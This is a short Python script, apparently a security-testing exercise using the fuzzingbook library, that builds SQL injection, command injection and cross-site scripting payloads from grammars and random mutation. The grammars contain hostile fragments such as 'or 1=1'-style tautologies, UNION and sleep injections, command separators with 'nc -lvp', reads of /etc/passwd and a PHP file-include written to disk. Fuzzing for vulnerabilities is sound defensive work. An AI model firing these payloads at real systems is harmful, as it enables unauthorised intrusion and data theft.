from fuzzingbook.fuzzingbook.Grammars import Grammar, simple_grammar_fuzzer
from fuzzingbook.fuzzingbook.MutationFuzzer import MutationFuzzer

sql_GRAMMAR: Grammar = {
    "<start>":
        ["<payload>"],
    "<payload>":
        ["<S0> <S1> <S2> <S3>"],
    "<S0>":
        ["1’", "eETd”", "xDd3')"],
    "<S1>":
        ["or 2>1", "or 'x'='x", "AND 1=0"],
    "<S2>":
        ["", "UNION select sleep(1)", "UnIoN select 1,’09ac5d’", "extractvalue(1,select @@version)"],
    "<S3>":
        ["--", "#", "/*"],
}

RCE_GRAMMAR: Grammar = {
    "<start>":
        ["<payload>"],
    "<payload>":
        ["<S0> <S1> <S2> <S0>"],
    "<S0>":
        ["||", "& ", "&&", "%0a%0d", "a", ""],
    "<S1>":
        ["curl", "cat", 'dir', 'echo', 'exec', 'eval', 'ipconfig', 'ls', 'nc -lvp 666', "ping"],
    "<S2>":
        ["('ls')", "('pwd')", "onerror=”<S3>”", r"C:\Users",'''<?php include($_GET['main.php']); ?>" > rfi.php''', "('whoami')", "<img src=http://google.com onload=prompt(2) onerror=alert(3)>", "/etc/passwd", "/etc/hosts", "http://google.com", "|id|", "/usr/bin/id", "localhost"], #<img> = batata
    "<S3>":
        ["| <S2>"],
}
js_GRAMMAR: Grammar = {
    "<start>":
        ["<payload>"],
    "<payload>":
        ["<S0> <S2> <S3>"],
    "<S0>":
        ["abobrinha", "<scr", '">', "<img src=", "<svg/onload=", "<textarea", "<"],
    "<S1>":
        [">"],
    "<S2>":
        ["alert('XSS')", "alert(String.fromCharCode(88,83,83))", "alert(1)"],
    "<S3>":
        ["</script>", ">"],
}



print("Geração baseada em Gramática")
for i in range(20): 
    #Geração de 60 payloads
    print(simple_grammar_fuzzer(grammar=RCE_GRAMMAR, max_nonterminals=20))
    print(simple_grammar_fuzzer(grammar=sql_GRAMMAR, max_nonterminals=20))
    print(simple_grammar_fuzzer(grammar=js_GRAMMAR, max_nonterminals=20))
    
print("Geração baseada em Mutação Aleatória")
seed_input = '' #A seed inserida será mutada. Exemplos de seeds: " OR 1 = 1 -- , <script>alert('XSS')</script> e " || whoami
mutation_fuzzer = MutationFuzzer(seed=[seed_input])
for i in range(20):
    #Geração de 20 payloads  
    mutation_fuzzer.fuzz()
